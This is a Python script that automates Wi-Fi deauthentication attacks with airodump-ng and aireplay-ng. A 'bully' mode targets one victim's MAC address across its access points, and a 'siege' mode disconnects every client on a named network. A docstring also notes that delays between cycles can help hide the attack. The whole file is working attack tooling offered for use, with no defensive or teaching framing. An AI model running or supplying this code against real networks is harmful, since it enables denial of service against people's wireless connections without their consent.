import os
from datetime import datetime
import time
import subprocess


LAST_CHANNEL = float("inf")

def get_bully_attack_list(d, victim):
    l = {}
    for channel in d[victim]["channels"]:
        if not channel in l:
            l[channel] = []
        for bssid in d[victim]["channels"][channel]:
            l[channel].append({"client_mac":victim, "ap_mac":bssid})
    return l

def get_siege_attack_list(d, essid, clients):
    # list of dictionaries to make it easy to change channels
    l = {}
    for channel in d[essid]:
        if channel not in l:
            l[channel] = []
        for  ap_mac in d[essid][channel]:
            for client_mac in d[essid][channel][ap_mac]:
                l[channel].append({"client_mac":client_mac, "ap_mac":ap_mac})

    return l


def hop_to_channel(c, adapter="wlan0mon"):
    return subprocess.Popen(["airodump-ng", adapter,"-c",str(c)],
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE)


def begin_attack(
                 dict1,
                 dict2,
                 mode="bully",
                 victims_mac = None,
                 net_clients = None,
                 ESSID = None,
                 attack_time = 10,
                 wireless_adapter = "wlan0mon"
                ):

    """
    :param dict1: essid dict data
    :param dict2: inverted index
    :param mode:  defaults to bully mode, otherwise indicate "siege"

    :param victims_mac: must be a string with the mac address to be bullied
                        and passed by name if bully mode

    :param ESSID: must be a string with the identifier of a network
    :param net_clients: optional list of clients in ESSID network clients
                        passing an empty list indicates attack all

    :param attack_time: attack length duration in seconds, defaults to 180
    :return:            1/0
    """

    global LAST_CHANNEL

    attack_list = []
    channels = []

    if mode == "bully":
        assert net_clients  is None
        assert ESSID is None
        assert not dict2 is None
        attack_list = get_bully_attack_list(dict2,victims_mac)

    else:
        assert victims_mac is None
        assert not dict1 is None
        attack_list = get_siege_attack_list(dict1, ESSID, net_clients)

    CURR_TIME = datetime.now()
    TIME_DIFF = 0
    import json

    i = 0
    channels = list(attack_list.keys())
    LAST_CHANNEL = channels[0]
    channel = channels[0]
    airodump = hop_to_channel(channel,wireless_adapter)

    while (datetime.now()-CURR_TIME).total_seconds() < attack_time:
        channel = channels[i]
        if not channel == LAST_CHANNEL:
            airodump.kill()
            time.sleep(.1)
            print ("last channel:",LAST_CHANNEL,"new channel:", channel)
            LAST_CHANNEL = channel
            airodump = hop_to_channel(channel,wireless_adapter)
            time.sleep(.1)

        attack_clients(attack_list[channel], 1, wireless_adapter, list_cycles=4, time_between_cycles=0 )
        i = (i + 1) % len(channels) - 1
    return 0





def de_auth_client( client_mac,
                    access_point_mac,
                    deauths=1,
                    adapter="wlan0mon"):

    """
    :param client_mac:
    :param access_point_mac:
    :param deauths: number of de-authentications (128 packets to router and client per deauth)
    :param adapter:
    :return:
    r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
              + " -c " + client_mac + " " + adapter)

    """

    print (client_mac)
    r2 = subprocess.call(["aireplay-ng", "-0", str(deauths), "-a", str(access_point_mac),\
                          "-c", client_mac, adapter], stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    #stdout, stderr = r2.communicate()
    #return r


def attack_clients(attack_dict,
                   de_auths_per_client,
                   adapter,
                   timeout=60,
                   list_cycles=100,
                   time_between_cycles=1
                   ):
    """
    :param clients_dict: a dictionary of clients with (at least) client_mac, ap_mac. keys
    :param de_auths_per_client: (int) doesn't necessarily have to be large if
           cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
           Passing this option as zero makes it unlimited deauths
    :param adapter: If not wlan0mon pass name here
    :param timeout: how long is the attack
    :param list_cycles: how many iterations over the list of victims
    :param time_between_cycles: (int/float  in seconds) can help obscure the attack
    :return:  nothing

        IMPORTANT. List of clients exist on a per-channel basis. So this function needs to be
        called for every channel where there are targets.
    """
    CURR_TIME = datetime.now()
    TIME_DIFF = datetime.now() - CURR_TIME


    for i in range (list_cycles):
        TIME_DIFF = datetime.now() - CURR_TIME
        for pair in attack_dict:
            if timeout < TIME_DIFF.total_seconds() :
                print ("terminating timed attack")
                break
            else:
                de_auth_client(
                               pair["client_mac"],
                               pair["ap_mac"],
                               deauths=de_auths_per_client,
                               adapter=adapter
                               )
                if time_between_cycles > 0:
                    time.sleep(time_between_cycles)


if __name__ == "__main__":
    pass
